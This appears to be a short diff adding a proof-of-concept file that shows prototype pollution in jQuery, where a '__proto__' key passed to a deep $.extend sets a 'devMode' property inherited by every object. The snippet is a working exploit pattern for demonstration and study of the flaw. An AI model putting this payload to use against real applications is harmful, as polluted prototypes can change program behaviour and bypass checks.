@@ -1,0 +1,4 @@
+Prototype Pollution in Jquery:
+
+$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
+console.log({}.devMode);
